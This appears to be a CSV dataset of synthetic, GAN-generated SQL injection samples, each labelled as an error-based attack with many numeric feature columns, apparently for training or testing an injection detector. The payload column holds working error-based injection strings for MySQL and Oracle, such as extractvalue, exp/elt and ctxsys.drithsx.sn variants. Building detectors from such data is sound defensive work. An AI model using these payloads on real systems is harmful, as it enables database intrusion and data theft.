id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000143,attack,error,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""ftjg""  =  ""ftjg",nearest_attack_euclidean,R000048,4.948292368233789,282.2638854980469,71.25221252441406,40.92101287841797,109.91969299316406,2.571120262145996,80.16594696044922,43.94269561767578,0.968608558177948,0.2869703769683838,0.16272537410259247,0.40491771697998047,0.1379188448190689,3.6986169815063477,1.0291930437088013,0.9331785440444946,0.6240025162696838,0.10964560508728027,0.04226555675268173,0.1941409856081009,10.225111961364746,10.437726020812988,2.708125352859497,0.12822885811328888,2.0173306465148926,0.16673587262630463,0.009197967126965523,0.3295409381389618,0.0898805782198906,0.5919738411903381,0.058848749846220016,-0.18498647212982178,1.6165525913238525,0.04071458429098129,0.297550231218338,2.1626052856445312,8.95415210723877,0.9404689073562622,1.9128482341766357,0.22426679730415344,0.3260945677757263,0.9147117733955383,0.1941090226173401,0.06043519452214241,0.08840657770633698,-0.0361868292093277,-0.15031138062477112,0.5127588510513306,0.4288038909435272,0.47664567828178406,0.42372843623161316,0.3882848918437958,-0.09388038516044617,-0.03269834443926811,0.22351518273353577,0.02765599451959133,0.004374009091407061,-0.029229629784822464,-0.10379517078399658,0.00982106477022171,-0.011407442390918732,0.0077074021100997925,-0.02529866248369217,0.05708540230989456,0.19031955301761627,-0.027928713709115982,0.47483980655670166,0.12730887532234192,0.1145368218421936,-0.08591387420892715,0.015342533588409424,-0.16697342693805695,-0.05768866837024689,0.0828545019030571,0.0075714318081736565,0.07339122891426086,1.0864620208740234,0.3248661160469055,-0.03973470628261566,0.10004618763923645,0.2097126692533493,8.64783000946045,0.7347685694694519,0.13596482574939728,0.006467263679951429,0.5691758394241333,-0.13296349346637726,-0.003438759595155716,-0.164637953042984
GAN_000144,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000069,5.264254111511515,290.1563720703125,68.52793884277344,40.81590270996094,104.9071044921875,0.4832361340522766,89.16673278808594,52.185997009277344,1.5621380805969238,0.2427823543548584,0.16879893839359283,0.4057576060295105,0.13811197876930237,3.633760452270508,0.9992358088493347,1.489333987236023,0.6748115420341492,0.1801212877035141,-0.008761825039982796,0.1640443056821823,11.831494331359863,9.091732025146484,2.381796360015869,-0.15017017722129822,2.0160162448883057,0.1448449343442917,0.06193628907203674,0.07112186402082443,-0.08018594980239868,0.712236762046814,0.03345304727554321,-0.14451469480991364,1.5675601959228516,0.2834496796131134,0.37009546160697937,2.2806146144866943,7.8305864334106445,0.311882346868515,1.9824435710906982,0.4776313006877899,0.463918536901474,1.029398798942566,0.08096889406442642,-0.009790283627808094,0.3005775809288025,0.12192624062299728,-0.36472588777542114,0.4929896295070648,0.35803261399269104,0.5353596210479736,0.0557599775493145,0.4921205937862396,-0.2510559856891632,0.05179786682128906,0.27741390466690063,-0.049759890884160995,-0.009221795946359634,-0.0972972959280014,0.34011009335517883,0.14973482489585876,-0.2267867922782898,0.2828535735607147,-0.09988271445035934,0.012696947902441025,0.2410888373851776,0.03460875526070595,0.5485730767250061,0.33487454056739807,0.12513796985149384,-0.3584161698818207,-0.003924146294593811,-0.05007379874587059,-0.0206742063164711,0.25729453563690186,0.028924299404025078,0.19958940148353577,1.1238864660263062,0.3205712139606476,-0.33418625593185425,-0.031977929174900055,0.22405797243118286,8.421257972717285,0.9280407428741455,0.2797183394432068,-0.04106546565890312,0.5602089762687683,-0.2552604675292969,0.4046761989593506,-0.1111895889043808
GAN_000145,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,5.2468913669681445,291.3726501464844,72.0842514038086,43.0723762512207,106.96690368652344,2.2488210201263428,87.42571258544922,48.959232330322266,1.192467212677002,0.2536216378211975,0.1564531922340393,0.41484972834587097,0.13083171844482422,3.582892417907715,0.7545853853225708,1.7969892024993896,0.9648582935333252,0.1192481592297554,0.03962716832756996,-0.1197124719619751,11.97201156616211,10.976611137390137,2.373455286026001,0.11756902933120728,1.9511038064956665,0.21171922981739044,0.1329534500837326,0.06194474920630455,0.08767381310462952,0.5566939115524292,-0.12513771653175354,-0.01085275411605835,1.5181554555892944,0.18227888643741608,0.348382830619812,2.3833630084991455,7.903990745544434,0.9273830056190491,1.9608466625213623,0.10055354237556458,0.5400717854499817,0.9854094982147217,-0.20074880123138428,0.031151609495282173,0.28066787123680115,-0.21130070090293884,-0.35609400272369385,0.677985668182373,0.5112901926040649,0.6265493035316467,0.23901788890361786,0.4302837550640106,-0.5188566446304321,0.3821243345737457,0.28514453768730164,0.026389745995402336,0.011980358511209488,0.1698099672794342,0.20937776565551758,0.1262957900762558,0.0718325674533844,0.4550700783729553,-0.27249693870544434,-0.04441211372613907,0.3245064318180084,0.02333664521574974,0.5273527503013611,0.2409159243106842,0.17200985550880432,-0.15171343088150024,-0.16121861338615417,-0.317143976688385,-0.010038942098617554,-0.12340112030506134,0.026714691892266273,0.02755582146346569,1.1899932622909546,0.24764394760131836,0.014860302209854126,-0.08389651030302048,0.07177150994539261,7.038432598114014,0.905860960483551,0.24362708628177643,-0.06661807745695114,0.5706237554550171,-0.08924172818660736,-0.06008031219244003,0.154403954744339
GAN_000146,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000069,4.992378747632719,276.1522521972656,70.7569351196289,41.2269401550293,110.1182632446289,-0.28961437940597534,84.53825378417969,49.87962341308594,0.9246047139167786,0.2533605992794037,0.1662617027759552,0.405190646648407,0.13611851632595062,3.66654372215271,1.2410829067230225,1.222124695777893,0.6756150126457214,0.12659071385860443,0.05547444522380829,0.24729588627815247,10.933847427368164,11.419281005859375,2.9839768409729004,-0.0002592727541923523,1.8630589246749878,0.15403059124946594,-0.1750122457742691,0.02247529849410057,0.006754748057574034,0.6906241178512573,-0.1543850302696228,-0.115941122174263,1.5391327142715454,0.1882430911064148,0.3922196924686432,2.1616153717041016,9.108051300048828,0.8097290396690369,1.9067524671554565,0.1668851673603058,0.3680480718612671,1.0693820714950562,-0.14531943202018738,0.011435969732701778,0.19579541683197021,-0.008346542716026306,-0.08411545306444168,0.5079928040504456,0.546512246131897,0.5746663212776184,0.14635781943798065,0.346312016248703,0.05047991871833801,0.045778676867485046,0.1810944676399231,-0.0032631841022521257,0.027717772871255875,0.08289288729429245,0.08676886558532715,0.2007533609867096,0.0017495155334472656,0.08502840250730515,-0.11314237862825394,0.003485504537820816,0.19286614656448364,-0.08674949407577515,0.4444164037704468,0.14354678988456726,0.16723215579986572,0.013719767332077026,-0.14897224307060242,-0.10104113072156906,0.1459859311580658,0.2204417586326599,0.011270256713032722,-0.11335695534944534,1.4531484842300415,0.31944188475608826,-0.216201514005661,0.0037673180922865868,0.2110743373632431,8.190651893615723,0.9418580532073975,0.20832647383213043,-0.031205352395772934,0.5730115175247192,0.08574162423610687,0.24805398285388947,-0.02325737476348877
GAN_000147,attack,error,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""ftjg""  =  ""ftjg",nearest_attack_euclidean,R000048,4.9974467852527,274.9115905761719,70.57437133789062,41.89195251464844,109.05089569091797,1.8041353225708008,82.28799438476562,44.318572998046875,0.9200664758682251,0.2690143585205078,0.1659879833459854,0.4040704667568207,0.13192404806613922,3.6780331134796143,0.9179090857505798,1.0822268724441528,0.7065832614898682,0.11999107897281647,0.05145348235964775,0.033603984862565994,10.87357234954834,10.978252410888672,2.6264445781707764,0.035989485681056976,1.9561131000518799,0.20503492653369904,-0.04148942232131958,0.21306012570858002,0.10130451619625092,0.615098774433136,-0.032979659736156464,-0.22722074389457703,1.7055777311325073,-0.0314677394926548,0.2941974401473999,2.315476655960083,9.42795467376709,1.1316773891448975,1.8973051309585571,0.054446954280138016,0.38450416922569275,0.8836169838905334,0.09313022345304489,0.04460994154214859,0.14849653840065002,-0.1787489354610443,0.05305187404155731,0.49038681387901306,0.5313965678215027,0.5494526028633118,0.3337706923484802,0.3347691595554352,-0.0385567769408226,0.11065385490655899,0.22062371671199799,0.04984581843018532,0.05024493858218193,0.04146076738834381,-0.10153783857822418,0.2779254615306854,0.0019734948873519897,-0.0013193637132644653,-0.0590573325753212,0.10653608292341232,0.20242001116275787,-0.007345989346504211,0.48472848534584045,0.026585198938846588,0.11457342654466629,0.04028959944844246,-0.05096166580915451,-0.1248510554432869,0.08112089335918427,-0.009814009070396423,0.010783764533698559,-0.054590657353401184,1.2478574514389038,0.403415322303772,-0.08427084982395172,0.09466870129108429,0.2177511751651764,8.410446166992188,0.7859359383583069,0.1949654370546341,0.048708997666835785,0.5869303345680237,0.013978168368339539,-0.1139044314622879,0.185069739818573
GAN_000148,attack,error,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""ftjg""  =  ""ftjg",nearest_attack_euclidean,R000048,5.089385227943858,275.8415832519531,72.37387084960938,39.88550567626953,111.19152069091797,-1.568962574005127,85.18772888183594,50.510799407958984,1.0624420642852783,0.2778790593147278,0.1641370803117752,0.41029345989227295,0.1368090808391571,3.671942710876465,1.097456932067871,1.4052172899246216,0.6991979479789734,0.11075418442487717,0.06328502297401428,0.36540523171424866,11.911529541015625,10.0470609664917,2.8408048152923584,0.11756059527397156,1.8891099691390991,0.15269458293914795,0.15463660657405853,0.03601407632231712,0.013465269468724728,0.6506453156471252,-0.10059485584497452,-0.1928117573261261,1.6102381944656372,0.16659843921661377,0.3792612850666046,2.084820032119751,8.46865463256836,0.8980023264884949,2.2333226203918457,0.36156800389289856,0.40025055408477783,0.9417276382446289,0.036096807569265366,0.05917402356863022,0.2242850661277771,-0.2176814079284668,-0.15809965133666992,0.5829732418060303,0.4498109221458435,0.5827394127845764,0.2233966588973999,0.3459521532058716,-0.13551832735538483,-0.042123373597860336,0.1508476287126541,-0.053657714277505875,0.02740076556801796,-0.19135472178459167,0.09609399735927582,0.2500556409358978,-0.14142972230911255,0.0416092574596405,-0.1917748749256134,-0.07287803292274475,0.23932042717933655,-0.03988388553261757,0.42866840958595276,0.3171822130680084,0.06547811627388,-0.11182602494955063,0.02378864213824272,-0.15703773498535156,0.08461541682481766,0.1361226737499237,0.024943727999925613,-0.158554345369339,1.2198166847229004,0.2500593364238739,-0.2000996172428131,0.05869279056787491,0.10564929991960526,7.721024990081787,0.8985832333564758,0.1642673909664154,-0.06315859407186508,0.6765246391296387,0.04893486201763153,0.10155418515205383,-0.09227331727743149
GAN_000149,attack,error,"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'cuat'  =  'cuat",nearest_attack_euclidean,R000301,4.933399688887077,275.994384765625,71.97911071777344,42.32941436767578,116.37181091308594,-0.3822476267814636,81.54157257080078,45.53508758544922,1.0573792457580566,0.2731345593929291,0.16258428990840912,0.40695568919181824,0.13615022599697113,3.658250331878662,1.1362130641937256,1.272066354751587,0.816016674041748,0.12054739892482758,0.04932403936982155,0.2537115216255188,10.778824806213379,10.957910537719727,3.2420685291290283,0.05322769656777382,1.8770784139633179,0.14491067826747894,-0.031061843037605286,0.15366557240486145,0.049284927546978,0.596381664276123,-0.1304275393486023,-0.17154449224472046,1.6772998571395874,0.12335331737995148,0.3700254261493683,2.202636957168579,9.020676612854004,0.9598211050033569,1.9968408346176147,0.165404811501503,0.34574955701828003,0.8978063464164734,0.032332953065633774,0.03538116067647934,0.16662046313285828,-0.08471888303756714,-0.12658870220184326,0.5088915824890137,0.5093789100646973,0.4919973909854889,0.26856034994125366,0.3328789174556732,-0.01993905007839203,-0.05773950740695,0.1591469943523407,0.013779162429273129,0.0801083892583847,0.08728525787591934,-0.09859655052423477,0.23501098155975342,-0.004018925130367279,-0.05665330961346626,-0.1286669373512268,-0.006579779088497162,0.21422140300273895,0.028666455298662186,0.5079929828643799,-0.02429116517305374,0.08609486371278763,0.029910676181316376,-0.03670120984315872,-0.17820867896080017,-0.03588035702705383,0.08616841584444046,0.017018770799040794,-0.010457947850227356,1.2903244495391846,0.386467844247818,-0.06278662383556366,0.0963834673166275,0.15077143907546997,8.222502708435059,0.7976232767105103,0.19404399394989014,-0.019980262964963913,0.6093277931213379,-0.037152890115976334,-0.005900047719478607,-0.0935973972082138
GAN_000150,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,5.299449547791539,289.9204406738281,74.67491149902344,40.29058074951172,116.94108581542969,-0.751656711101532,86.92083740234375,52.89467239379883,1.196932077407837,0.25338613986968994,0.1555512696504593,0.409210741519928,0.13270218670368195,3.621898651123047,1.0791065692901611,1.866483449935913,0.8331588506698608,0.08673708885908127,0.04754955694079399,0.22916819155216217,12.049010276794434,10.70091724395752,3.0343244075775146,0.044773995876312256,1.8811691999435425,0.14069780707359314,0.04992852732539177,-0.12666833400726318,-0.005237743724137545,0.6289820075035095,-0.22155117988586426,-0.04677118360996246,1.542435884475708,0.32245734333992004,0.43731385469436646,2.1326656341552734,7.75108003616333,0.7192249298095703,2.044434070587158,0.1948726922273636,0.4731958508491516,1.0611517429351807,-0.30473098158836365,0.03476669266819954,0.2591407895088196,-0.21650919318199158,-0.3084726929664612,0.6051093935966492,0.5266638398170471,0.5811671614646912,0.1008235365152359,0.40050166845321655,-0.35044291615486145,0.08281364291906357,0.17827515304088593,-0.038543302565813065,0.011890828609466553,-0.09009839594364166,0.32178348302841187,0.28396153450012207,-0.07270563393831253,0.4125986397266388,-0.17808952927589417,-0.18680265545845032,0.26470258831977844,0.07162851095199585,0.4668104946613312,0.27053043246269226,0.2074090838432312,-0.09124822169542313,-0.2112349569797516,-0.2615741789340973,0.03331713750958443,0.05685082823038101,0.027978351339697838,-0.11584999412298203,1.3180021047592163,0.26470136642456055,-0.16915461421012878,-0.08489035815000534,0.10200968384742737,6.874502182006836,1.0348381996154785,0.24293018877506256,-0.113522008061409,0.6118833422660828,0.010236602276563644,0.25482022762298584,0.10924872756004333
GAN_000151,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000069,5.30643426142276,277.02142333984375,68.82459259033203,42.46752166748047,105.41474914550781,5.420652866363525,88.76222229003906,48.31318283081055,1.0984656810760498,0.24745848774909973,0.16501720249652863,0.4102730453014374,0.12880368530750275,3.620941400527954,0.3765179514884949,1.4859939813613892,0.8573071956634521,0.16326914727687836,0.08136637508869171,-0.01809278130531311,11.218412399291992,11.167941093444824,2.2130322456359863,0.10492765158414841,1.980956792831421,0.26324865221977234,0.06827521324157715,0.1464603990316391,0.0929039791226387,0.7020753026008606,-0.1506161093711853,-0.0785212591290474,1.5793687105178833,-0.019430749118328094,0.3264607787132263,2.4723002910614014,9.168403625488281,0.9353207945823669,1.7909444570541382,-0.02106950804591179,0.44908836483955383,1.0094314813613892,-0.1656949520111084,0.02466345578432083,0.26016613841056824,-0.31237488985061646,-0.1656503975391388,0.576341986656189,0.6391764283180237,0.5826561450958252,0.18112285435199738,0.19759564101696014,-0.29464614391326904,0.4733160436153412,0.2915859818458557,0.015138075686991215,0.0027687589172273874,0.10250666737556458,0.047321826219558716,0.04659697413444519,0.2639063894748688,0.02343165874481201,-0.320343017578125,0.006480041891336441,0.28241732716560364,-0.12647251784801483,0.4683319330215454,0.09987223893404007,0.2420150190591812,0.047319263219833374,-0.11219386756420135,-0.1437259018421173,-0.005090661346912384,0.03706120699644089,0.026226509362459183,-0.11005569249391556,1.4304596185684204,0.30741286277770996,-0.035344839096069336,-0.00023569262702949345,0.16673064231872559,7.878939151763916,0.8191784024238586,0.24011720716953278,-0.0005988075281493366,0.5492170453071594,0.02877628803253174,-0.07585728168487549,0.13176482915878296
GAN_000152,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,5.175126120171734,290.9057312011719,70.62064361572266,39.44014358520508,107.4546890258789,-0.24485822021961212,84.87312316894531,51.81198501586914,1.0231839418411255,0.24937216937541962,0.1650652438402176,0.40583622455596924,0.14002862572669983,3.646247386932373,1.1130032539367676,1.3628199100494385,0.707284688949585,0.1556767374277115,0.0603322833776474,0.14816579222679138,12.262872695922852,9.937407493591309,2.6557352542877197,-0.05751810222864151,1.8115592002868652,0.1891828328371048,-0.030012039467692375,-0.19891241192817688,-0.01393980998545885,0.8445711731910706,-0.173356831073761,-0.3176755905151367,1.5100184679031372,0.13164976239204407,0.322908878326416,2.2100722789764404,9.204567909240723,0.6873397827148438,2.1380271911621094,0.23834772408008575,0.4882669448852539,1.0417252779006958,0.037683725357055664,0.0003401704889256507,0.3408927321434021,-0.11726170778274536,-0.16337409615516663,0.5212427377700806,0.4952479600906372,0.6766162514686584,0.1023847907781601,0.37074336409568787,0.08881638944149017,0.15215498208999634,0.21712075173854828,-0.05711746588349342,-0.002298112725839019,-0.14038404822349548,0.17891913652420044,0.32211628556251526,-0.11876659095287323,-0.03214306756854057,-0.18865656852722168,0.03998444229364395,0.22138580679893494,0.06435596942901611,0.3931976854801178,0.4173847436904907,0.19227750599384308,-0.029965713620185852,-0.24511602520942688,-0.06391455978155136,0.18454331159591675,0.15486270189285278,0.027433309704065323,-0.10118641704320908,1.3130160570144653,0.23574526607990265,-0.35304707288742065,0.0018167411908507347,0.2713269591331482,8.306342124938965,1.0559229850769043,0.20503823459148407,-0.02037316933274269,0.649760365486145,0.14449959993362427,0.35447177290916443,0.07139705121517181
GAN_000153,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,4.973502297524814,287.1854248046875,69.5359878540039,41.00215530395508,108.11151123046875,2.184221029281616,86.09486389160156,47.716373443603516,0.6955568790435791,0.26833537220954895,0.15489761531352997,0.40516695380210876,0.13358622789382935,3.6538848876953125,0.8866338729858398,1.1737526655197144,0.6492167115211487,0.08045868575572968,0.037113435566425323,0.07091119885444641,11.609504699707031,11.247438430786133,2.5742523670196533,0.19086702167987823,1.8824812173843384,0.19804568588733673,0.023926567286252975,0.03374185785651207,0.05339568853378296,0.6093877553939819,-0.18146556615829468,-0.09741786122322083,1.4650969505310059,-0.018653370440006256,0.336678683757782,2.2690236568450928,9.411580085754395,1.0828580856323242,2.0241804122924805,0.08937017619609833,0.44583800435066223,1.127838373184204,-0.05222424119710922,0.04027126729488373,0.411236435174942,-0.21366441249847412,-0.1389945149421692,0.5443398356437683,0.47716259956359863,0.6256276965141296,0.28975120186805725,0.358667254447937,-0.03890810161828995,0.24947640299797058,0.23746304214000702,-0.013436217792332172,0.008074112236499786,-0.02283039689064026,0.08742646872997284,0.3316876292228699,0.0747198760509491,0.020297423005104065,-0.19054275751113892,-0.057913243770599365,0.26767370104789734,0.06827881932258606,0.3936430513858795,0.35269927978515625,0.09185199439525604,-0.04409518092870712,-0.24161770939826965,-0.14723099768161774,0.030274882912635803,0.0067026615142822266,0.011739790439605713,-0.12671539187431335,1.2756887674331665,0.29309409856796265,-0.0775059163570404,0.019430121406912804,0.218392014503479,8.131155967712402,0.9312119483947754,0.19683338701725006,-0.019621219485998154,0.5726656317710876,0.022626616060733795,0.028700176626443863,0.20203354954719543
GAN_000154,attack,error,"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""oyfk""  =  ""oyfk",nearest_attack_euclidean,R000239,5.204970643636566,302.7120361328125,73.78221893310547,40.214515686035156,105.80663299560547,-2.1280345916748047,80.26564025878906,52.17716598510742,1.2512398958206177,0.26700812578201294,0.1617909073829651,0.4143276810646057,0.13775449991226196,3.611809253692627,1.143326759338379,1.955322504043579,0.8925442099571228,0.16143354773521423,0.06553512066602707,0.13768303394317627,12.431893348693848,9.546701431274414,2.734192371368408,-0.13645502924919128,1.9188939332962036,0.1632021963596344,0.23467393219470978,-0.09108937531709671,0.011150634847581387,0.7766706347465515,-0.12189070135354996,-0.1001395657658577,1.57576322555542,0.10057113319635391,0.38445526361465454,2.3487470149993896,8.9697904586792,0.9120572805404663,2.4849212169647217,0.2466699630022049,0.4096432328224182,0.9335415363311768,0.03599778562784195,0.05895322933793068,0.27541741728782654,-0.1965988278388977,-0.24043434858322144,0.5700991749763489,0.4276840090751648,0.6001676321029663,0.09579326212406158,0.40499842166900635,-0.20399993658065796,0.2865719795227051,0.16293829679489136,-0.04525826498866081,0.054506052285432816,-0.056543946266174316,0.1117023229598999,0.31196850538253784,-0.011930234730243683,-0.06562027335166931,-0.3789225220680237,0.05847606062889099,0.29019057750701904,-0.13528582453727722,0.593977689743042,0.4559711813926697,0.05779373645782471,0.017915740609169006,0.029655229300260544,-0.1476423740386963,0.02329322323203087,0.22463637590408325,0.041006263345479965,-0.07893077284097672,1.2605935335159302,0.3357560932636261,-0.2764430046081543,-0.021358216181397438,0.17422887682914734,8.07960319519043,0.9115700125694275,0.19140152633190155,-0.012960647232830524,0.7283506393432617,0.06876741349697113,0.08846442401409149,-0.15600281953811646
GAN_000155,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,5.230908117978292,288.02838134765625,67.28129577636719,38.424713134765625,103.9578857421875,0.2768591046333313,87.364013671875,52.42742156982422,0.8547936081886292,0.25962841510772705,0.1627742201089859,0.4061678946018219,0.1407754272222519,3.638152837753296,0.872090756893158,1.3659180402755737,0.4714904725551605,0.13935355842113495,0.060658276081085205,0.2006622850894928,11.595123291015625,10.03852653503418,2.4794955253601074,0.012471593916416168,1.9037238359451294,0.20063917338848114,-0.06316421926021576,-0.15279832482337952,-0.030503209680318832,0.8375585675239563,-0.1712854504585266,-0.27501359581947327,1.4096657037734985,0.03541134297847748,0.3251032531261444,2.3178465366363525,9.883905410766602,0.7902740240097046,2.2356178760528564,0.21396185457706451,0.442104309797287,1.1521174907684326,-0.07670208066701889,0.01828773319721222,0.44897857308387756,-0.16901740431785583,-0.16623155772686005,0.5605633854866028,0.4587085247039795,0.6643449068069458,0.14469115436077118,0.3003391623497009,-0.07713542878627777,0.295539915561676,0.2613351047039032,-0.0849989503622055,-0.04833639785647392,-0.18773558735847473,0.18851017951965332,0.36152949929237366,-0.014704979956150055,-0.06134622544050217,-0.33639058470726013,0.027865402400493622,0.2550745904445648,-0.02651059627532959,0.37956541776657104,0.6467798352241516,0.19057536125183105,-0.06101766973733902,-0.2213112711906433,-0.0349801704287529,0.21410825848579407,0.17219138145446777,0.03255081549286842,-0.18412163853645325,1.375608205795288,0.2087099552154541,-0.3186623752117157,0.01652163825929165,0.2839628756046295,8.4867582321167,1.04133939743042,0.2036440074443817,-0.008879476226866245,0.6030576825141907,0.08433278650045395,0.3425338566303253,-0.00731118768453598
